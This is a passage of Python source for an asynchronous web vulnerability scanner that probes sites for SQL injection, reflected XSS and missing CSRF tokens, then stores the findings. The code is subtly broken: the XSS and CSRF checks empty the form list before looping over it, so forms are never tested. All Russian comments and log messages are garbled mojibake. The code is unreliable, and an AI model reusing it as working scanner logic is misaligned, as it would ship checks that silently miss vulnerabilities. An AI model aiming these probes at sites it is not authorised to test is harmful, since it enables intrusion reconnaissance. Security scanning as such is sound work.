                                duration = time.monotonic() - start_time

                            if duration > 5:
                                return True, f"Time-based SQLi with payload: {test_payload}"
                    
                            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ text –Ω–µ None –∏ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç—Ä–æ–∫–æ–π
                            if text:
                                if self._detect_sql_vulnerability(text):
                                    return True, f"Error-based SQLi with payload: {test_payload}"
                    
                    return False, None
                    
                except Exception as e:
                    logger.debug(f"SQLi sub-check error on {target_url}: {e}")
                    return False, None

            # –≠—Ç–∞–ø 1: –ë—ã—Å—Ç—Ä–∞—è –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–∞—è —Ä–∞–∑–≤–µ–¥–∫–∞
            exploratory_results = await asyncio.gather(*[_run_test(p) for p in ["'", '"']])
            if not any(is_vuln for is_vuln, _ in exploratory_results):
                return None
                    
            # –≠—Ç–∞–ø 2: –ü–æ–ª–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞
            for payload in SAFE_SQL_PAYLOADS:
                if self.should_stop: 
                    return None
                is_vulnerable, details = await _run_test(payload)
                if is_vulnerable:
                    return details

            return None
                                
        # --- –û—Å–Ω–æ–≤–Ω–∞—è –ª–æ–≥–∏–∫–∞ ---
        tasks: List[asyncio.Task[Optional[str]]] = []
        if '?' in url:
            tasks.append(asyncio.create_task(_test_target(url, test_method='GET')))
            
        if forms is None:
            forms = []
        for form in forms:
            if form:
                action = urljoin(url, str(form.get('action', '')))
                method: str = str(form.get('method', 'get')).upper()
                
                form_data: Dict[str, str] = {}
                inputs = form.find_all(['input', 'textarea', 'select'])
                for input_elem in inputs:
                    # –Ø–≤–Ω–æ–µ —É–∫–∞–∑–∞–Ω–∏–µ —Ç–∏–ø–∞ —Å –ø—Ä–∏–≤–µ–¥–µ–Ω–∏–µ–º
                    input_elem_tag: Tag = cast(Tag, input_elem)
                    name: str = str(input_elem_tag.get('name', ''))
                    if name:
                        form_data[name] = '1'

                if method == 'POST':
                    tasks.append(asyncio.create_task(_test_target(action, test_method='POST', test_data=form_data)))
                else:
                    if form_data:
                        form_target_url = f"{action}?{urlencode(form_data)}"
                        tasks.append(asyncio.create_task(_test_target(form_target_url, test_method='GET')))
        
        if not tasks:
            return None
        
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for res in results:
            if isinstance(res, Exception):
                log_and_notify('error', f"SQLi check task failed: {res}")

        return next((res for res in results if isinstance(res, str)), None)



    @staticmethod
    def _detect_sql_vulnerability(response_text: str) -> bool:
        """
        –û–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ—Ç —É—è–∑–≤–∏–º–æ—Å—Ç—å –∫ SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏, –∞–Ω–∞–ª–∏–∑–∏—Ä—É—è —Ç–µ–∫—Å—Ç –æ—Ç–≤–µ—Ç–∞.
        """
        if not response_text:
            return False
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –ø–∞—Ç—Ç–µ—Ä–Ω–æ–≤ –æ—à–∏–±–æ–∫ –≤ –æ—Ç–≤–µ—Ç–µ
        return any(pattern.search(response_text) for pattern in SQL_ERROR_PATTERNS)

    async def check_xss(self, session: aiohttp.ClientSession, url: str, forms: List[Tag]) -> Optional[str]:
        """–£–ª—å—Ç—Ä–∞-–æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ XSS. –ê–Ω–∞–ª–æ–≥–∏—á–Ω–∞ SQLi-—Å–∫–∞–Ω–µ—Ä—É."""

        async def _test_target(target_url: str, test_method: str = 'GET', data: Optional[Dict[str, str]] = None) -> Optional[str]:
            """–¢–µ—Å—Ç–∏—Ä—É–µ—Ç –æ–¥–∏–Ω URL –∏–ª–∏ —Ñ–æ—Ä–º—É –Ω–∞ XSS."""

            async def _run_test(test_payload: str) -> Tuple[bool, Optional[str]]:
                """–ó–∞–ø—É—Å–∫–∞–µ—Ç –æ–¥–∏–Ω XSS-—Ç–µ—Å—Ç –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç."""
                req_data = {k: test_payload for k in data} if data and test_method == 'POST' else None
                if test_method == 'GET':
                    parsed = urlparse(target_url)
                    params = {k: test_payload for k in parse_qs(parsed.query)}
                    req_url = parsed._replace(query=urlencode(params, doseq=True)).geturl()
                else:
                    req_url = target_url

                try:
                    result = await self.smart_request(session, test_method, req_url, data=req_data)
                    if result is None:
                        return False, None
                    _, text = result

                    if text:
                        if self._detect_xss_vulnerability(text, test_payload):
                            return True, f"Reflected XSS with payload: {test_payload[:50]}..."
                except Exception as e:
                    logger.debug(f"XSS sub-check error on {target_url}: {e}")
                return False, None

            # –≠—Ç–∞–ø 1: –ë—ã—Å—Ç—Ä–∞—è —Ä–∞–∑–≤–µ–¥–∫–∞
            is_vuln, _ = await _run_test("<xss-probe-tag>")
            if not is_vuln:
                return None
                    
            # –≠—Ç–∞–ø 2: –ü–æ–ª–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞
            for test_payload in SAFE_XSS_PAYLOADS:
                if self.should_stop: return None
                is_vulnerable, details = await _run_test(test_payload)
                if is_vulnerable:
                    return details
            return None
                            
        # --- –û—Å–Ω–æ–≤–Ω–∞—è –ª–æ–≥–∏–∫–∞ ---
        tasks: List[asyncio.Task[Optional[str]]] = []
        if '?' in url:
            tasks.append(asyncio.create_task(_test_target(url, test_method='GET')))
            
        if forms:
            forms = []
        for form in forms:
            if form:
                action = urljoin(url, str(form.get('action', '')))
                method: str = str(form.get('method', 'get')).upper()
                form_data: Dict[str, str] = {}
                inputs = form.find_all(['input', 'textarea', 'select'])
                for input_elem in inputs:
                    # –Ø–≤–Ω–æ–µ —É–∫–∞–∑–∞–Ω–∏–µ —Ç–∏–ø–∞ —Å –ø—Ä–∏–≤–µ–¥–µ–Ω–∏–µ–º
                    input_elem_tag: Tag = cast(Tag, input_elem)
                    name: str = str(input_elem_tag.get('name', ''))
                    if name:
                        form_data[name] = '1'
                
                if method == 'POST':
                    tasks.append(asyncio.create_task(_test_target(action, test_method='POST', data=form_data)))
                else:
                    if form_data:
                        form_target_url = f"{action}?{urlencode(form_data)}"
                        tasks.append(asyncio.create_task(_test_target(form_target_url, test_method='GET')))

        if not tasks: return None

        results = await asyncio.gather(*tasks, return_exceptions=True)
        return next((res for res in results if isinstance(res, str)), None)

    @staticmethod
    def _detect_xss_vulnerability(response_text: str, payload: str) -> bool:
        """–û–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ—Ç XSS, –ø—Ä–æ–≤–µ—Ä—è—è, –æ—Ç—Ä–∞–∂–µ–Ω –ª–∏ –ø–µ–π–ª–æ–∞–¥ –±–µ–∑ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è."""
        if not response_text:
            return False
        return payload in response_text

    @staticmethod
    async def check_csrf(url: str, forms: List[Tag]) -> Optional[str]:
        """
        –û–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ CSRF. 
        –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ—Ç —Ñ–æ—Ä–º—ã –Ω–∞ –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –∞–Ω—Ç–∏-CSRF —Ç–æ–∫–µ–Ω–æ–≤.
        """
        try:
            known_csrf_token_names = {
                'csrf_token', 'csrfmiddlewaretoken', 'authenticity_token',
                '_csrf', '_token', '__requestverificationtoken', 'xsrf_token'
            }

            vulnerable_form_actions: List[str] = []
            
            if forms:
                forms = []
            for form in forms:
                try:
                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —ç—Ç–æ –æ–±—ä–µ–∫—Ç BeautifulSoup
                    if form:
                        action = urljoin(url, str(form.get('action', '')))
                        form_method: str = str(form.get('method', 'get')).upper()

                        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–æ–ª—å–∫–æ POST —Ñ–æ—Ä–º—ã
                        if form_method == 'POST':
                            # –ò—â–µ–º —Å–∫—Ä—ã—Ç—ã–µ –ø–æ–ª—è –≤ —Ñ–æ—Ä–º–µ
                            hidden_fields = form.find_all('input', type='hidden')
                            form_has_csrf_token = False
                            
                            for field in hidden_fields:
                                field_tag: Tag = cast(Tag, field)
                                field_name: str = str(field_tag.get('name', '')).lower()
                                if field_name in known_csrf_token_names:
                                    form_has_csrf_token = True
                                    break

                            # –ï—Å–ª–∏ —Ñ–æ—Ä–º–∞ –Ω–µ –∏–º–µ–µ—Ç CSRF —Ç–æ–∫–µ–Ω–∞, —Å—á–∏—Ç–∞–µ–º –µ—ë —É—è–∑–≤–∏–º–æ–π
                            if not form_has_csrf_token:
                                vulnerable_form_actions.append(action)
                                
                except Exception as e:
                    logger.warning(f"Error processing form in CSRF check: {e}")
                    continue

            if vulnerable_form_actions:
                unique_actions = sorted(list(set(vulnerable_form_actions)))
                result = f"Potential CSRF in POST forms to: {', '.join(unique_actions)}"
                return result
            
            return None
            
        except Exception as e:
            log_and_notify('error', f"Error in check_csrf: {e}")
            return None

    async def scan(self) -> Dict[str, Any]:
        """
        –û—Å–Ω–æ–≤–Ω–æ–π –º–µ—Ç–æ–¥ –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è.
        –≠–¢–ê–ü 1: –ö—Ä–∞—É–ª–∏–Ω–≥ (–æ–±—Ö–æ–¥ —Å–∞–π—Ç–∞, —Å–±–æ—Ä –≤—Å–µ—Ö —Å—Å—ã–ª–æ–∫ –∏ —Ñ–æ—Ä–º)
        –≠–¢–ê–ü 2: –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –ø–æ –Ω–∞–π–¥–µ–Ω–Ω—ã–º —Ü–µ–ª—è–º
        :return: –°–ª–æ–≤–∞—Ä—å —Å —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º–∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
        """
        try:
            logger.info(f"Starting scan for URL: {self.base_url} with types: {self.scan_types}")
            logger.info(f"Scan settings: max_depth={self.max_depth}, max_concurrent={self.max_concurrent}, timeout={self.timeout}")
            self.scan_completion_metrics['scan_start_time'] = datetime.now().isoformat()
            self.scan_completion_metrics['completion_status'] = 'in_progress'
            
            self.start_time = time.time()
            self.signals.log_event.emit(f"üöÄ –ù–∞—á–∏–Ω–∞–µ–º —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ: {self.base_url} (–≥–ª—É–±–∏–Ω–∞: {self.max_depth})")
            
            # === –≠–¢–ê–ü 1: –ö—Ä–∞—É–ª–∏–Ω–≥ (–æ–±—Ö–æ–¥ —Å–∞–π—Ç–∞) ===
            # –û—á–∏—â–∞–µ–º –≤—Å–µ —Å—á–µ—Ç—á–∏–∫–∏ –∏ –∫—ç—à–∏
            self.visited_urls.clear()
            self.scanned_urls.clear()
            self.all_scanned_urls.clear()
            self.all_found_forms.clear()
            self.scanned_form_hashes.clear()
            
            # –°–æ–∑–¥–∞–µ–º –æ—á–µ—Ä–µ–¥—å –¥–ª—è –æ–±—Ö–æ–¥–∞
            if self.to_visit is None:
                self.to_visit = asyncio.Queue()
                logger.info("Created asyncio.Queue in scan method")
            else:
                logger.info("Using existing asyncio.Queue in scan method")
            
            # –î–æ–±–∞–≤–ª—è–µ–º –Ω–∞—á–∞–ª—å–Ω—ã–π URL –≤ –æ—á–µ—Ä–µ–¥—å
            await self.to_visit.put((self.base_url, 0))
            self.total_links_count = 1
            logger.info(f"Added initial URL to queue: {self.base_url}")
            logger.info(f"Queue size after adding initial URL: {self.to_visit.qsize()}")
            
            # === –≠–¢–ê–ü 2: –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π ===
            # –°–æ–∑–¥–∞–µ–º —Å–µ—Å—Å–∏—é –∏ —Å–µ–º–∞—Ñ–æ—Ä —Å –æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–º–∏ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º–∏
            timeout = aiohttp.ClientTimeout(**HTTP_OPTIMIZATIONS['timeout'])
            logger.info(f"Created optimized session with timeout settings: {HTTP_OPTIMIZATIONS['timeout']}")
            
            async with aiohttp.ClientSession(timeout=timeout) as session:
                semaphore = asyncio.Semaphore(self.max_concurrent)
                logger.info("Starting parallel crawl and scan with optimized settings")

                # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º —Å–µ—Å—Å–∏—é –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ –¥—Ä—É–≥–∏—Ö –º–µ—Ç–æ–¥–∞—Ö
                self.session = session
                
                # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –¥–∞–Ω–Ω—ã—Ö
                results_by_type: Dict[str, List[str]] = {'sql': [], 'xss': [], 'csrf': []}
                visited_urls: Set[str] = set()
                scanned_urls: Set[str] = set()
                
                # –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º scan_types –≤ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç
                scan_types_lower: List[str] = []
                for scan_type in self.scan_types:
                    if 'sql' in scan_type.lower():
                        scan_types_lower.append('sql')
                    elif 'xss' in scan_type.lower():
                        scan_types_lower.append('xss')
                    elif 'csrf' in scan_type.lower():
                        scan_types_lower.append('csrf')
                # –ï—Å–ª–∏ scan_types –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω—ã, –∏—Å–ø–æ–ª—å–∑—É–µ–º –≤—Å–µ —Ç–∏–ø—ã
                if not scan_types_lower:
                    scan_types_lower = ['sql', 'xss', 'csrf']
                self.scan_types = scan_types_lower
                
                # –ó–∞–ø—É—Å–∫–∞–µ–º –æ—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª: –æ–±—Ö–æ–¥ + —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ
                # (–í–Ω—É—Ç—Ä–∏ crawl_and_scan_parallel —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω –æ–±—Ö–æ–¥ —Å–∞–π—Ç–∞ –∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞–π–¥–µ–Ω–Ω—ã—Ö —Ü–µ–ª–µ–π)
                await self.crawl_and_scan_parallel(session, semaphore, self.base_url, 
                                                 results_by_type, visited_urls, scanned_urls)
            
            # === –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –∏ –º–µ—Ç—Ä–∏–∫–∏ ===
            if self.should_stop:
                self.scan_completion_metrics['completion_status'] = 'stopped_by_user'
                logger.info(f"Scan stopped by user. Total URLs scanned: {self.total_scanned_count}")
                self.signals.log_event.emit(f"‚èπÔ∏è –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º. –ü—Ä–æ—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–æ URL: {self.total_scanned_count}")
            else:
                self.scan_completion_metrics['scan_end_time'] = datetime.now().isoformat()
                self.scan_completion_metrics['completion_status'] = 'completed'
                logger.info(f"Scan completed. Total URLs scanned: {self.total_scanned_count}")
            cleanup_caches()
            self.scan_completion_metrics['total_urls_discovered'] = self.total_links_count
            self.scan_completion_metrics['total_urls_scanned'] = len(self.all_scanned_urls)
            self.scan_completion_metrics['total_forms_discovered'] = self.total_forms_count
            self.scan_completion_metrics['total_forms_scanned'] = self.scanned_forms_count
            self.scan_completion_metrics['max_depth_reached'] = self.max_depth_reached
            logger.info(f"METRICS: urls_discovered={self.total_links_count}, urls_scanned={len(self.all_scanned_urls)}, forms_discovered={self.total_forms_count}, forms_scanned={self.scanned_forms_count}, max_depth_reached={self.max_depth_reached}")
            scan_duration = time.time() - self.start_time
            result: Dict[str, Any] = {
                'url': self.base_url,
                'scan_types': self.scan_types,
                'duration': scan_duration,
                'total_urls_scanned': len(self.all_scanned_urls),
                'total_forms_scanned': self.scanned_forms_count,
                'vulnerabilities': self.vulnerabilities,  # –ò—Å–ø–æ–ª—å–∑—É–µ–º —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
                'timestamp': datetime.now().isoformat(),
                'total_urls_discovered': self.total_links_count,
                'unscanned_urls': list(self.unscanned_urls)
            }
            total_vulnerabilities = sum(len(vulns) for vulns in self.vulnerabilities.values())
            self.signals.log_event.emit(f"‚úÖ –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ –∑–∞ {scan_duration:.2f}—Å")
            self.signals.log_event.emit(f"üìä –ü—Ä–æ—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–æ URL: {len(self.all_scanned_urls)}, —Ñ–æ—Ä–º: {self.scanned_forms_count}, —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π: {total_vulnerabilities}")

            # –§–∏–Ω–∞–ª—å–Ω–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
            self.update_stats()

            return result
        except Exception as e:
            log_and_notify('error', f"Error in scan method: {e}")
            self.scan_completion_metrics['completion_status'] = 'failed'
            # –£–±–µ–¥–∏–º—Å—è, —á—Ç–æ errors_encountered —è–≤–ª—è–µ—Ç—Å—è —á–∏—Å–ª–æ–º –ø–µ—Ä–µ–¥ –∏–Ω–∫—Ä–µ–º–µ–Ω—Ç–æ–º
            if isinstance(self.scan_completion_metrics['errors_encountered'], int):
                self.scan_completion_metrics['errors_encountered'] += 1
            else:
                self.scan_completion_metrics['errors_encountered'] = 1
            self.signals.log_event.emit(f"‚ùå –û—à–∏–±–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: {str(e)}")
            try:
                await self.save_results()
            except Exception as save_error:
                log_and_notify('error', f"Failed to save partial results: {save_error}")
            return {
                'url': self.base_url,
                'scan_types': self.scan_types,
                'duration': 0,
                'total_urls_scanned': 0,
                'total_forms_scanned': 0,
                'vulnerabilities': {'sql': [], 'xss': [], 'csrf': []},
                'timestamp': get_local_timestamp(),
                'error': str(e),
                'total_urls_discovered': 0,
                'unscanned_urls': list(self.unscanned_urls)
            }

    async def save_results(self):
        """
        –°–æ—Ö—Ä–∞–Ω—è–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –≤ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö.
        """
        try:
            logger.info("Saving scan results to database")
            scan_duration = time.time() - self.start_time if self.start_time > 0 else 0
            results: List[Dict[str, Any]] = []
            for vuln_type, vulns in self.vulnerabilities.items():
                for vuln in vulns:
                    results.append({
                        'type': vuln_type,
                        'url': vuln.get('url', self.base_url),
                        'details': vuln.get('details', ''),
                        'severity': vuln.get('severity', 'medium')
                    })
            scan_type = "comprehensive" if len(self.scan_types) > 1 else self.scan_types[0] if self.scan_types else "general"
            completion_status = getattr(self, 'scan_completion_metrics', {}).get('completion_status', 'unknown')
            if completion_status == 'stopped_by_user':
                scan_type += "_partial"
            # --- Batch insert (–µ—Å–ª–∏ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è) ---
            # save_scan_async —É–∂–µ —Ä–µ–∞–ª–∏–∑—É–µ—Ç batch insert, –µ—Å–ª–∏ results - —Å–ø–∏—Å–æ–∫
            success = db.save_scan_async(
                user_id=self.user_id,
                url=self.base_url,
                results=results,
                scan_type=scan_type,
                scan_duration=scan_duration
            )
            if success:
                logger.info(f"Scan results saved successfully for user {self.user_id}")
            else:
                log_and_notify('error', "Failed to save scan results")
            # --- –û—á–∏—Å—Ç–∫–∞ –∫—ç—à–µ–π –∏ —Å–±–æ—Ä–∫–∞ –º—É—Å–æ—Ä–∞ –ø–æ—Å–ª–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è ---
            if hasattr(cached_parse_html, 'cache_clear'):
                cached_parse_html.cache_clear()
            cleanup_caches()
            gc.collect()
        except Exception as e:
            log_and_notify('error', f"Error saving scan results: {e}")
            self.signals.log_event.emit(f"‚ùå –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤: {str(e)}")